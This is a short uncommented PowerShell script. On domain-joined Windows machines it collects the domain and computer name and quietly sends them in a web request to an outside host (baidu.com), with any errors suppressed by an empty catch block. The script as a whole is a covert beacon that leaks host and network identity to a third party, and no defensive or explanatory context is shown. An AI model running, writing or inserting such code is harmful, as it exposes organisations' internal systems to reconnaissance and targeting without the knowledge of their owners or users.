$computerInfo = Get-ComputerInfo  
if ($computerInfo.CsPartOfDomain) 
{ 
    $domain = $computerInfo.Domain  
    $computerName = $computerInfo.CsName  
    $domain = $computerInfo.CsDomain
    $fullString = $domain+"_"+$computerName 
    $url = "http://www.baidu.com/?q="+$fullString  
    try {  
        $response = Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing  
    } catch { 
    }  

} 
else
{  
    exit  
}
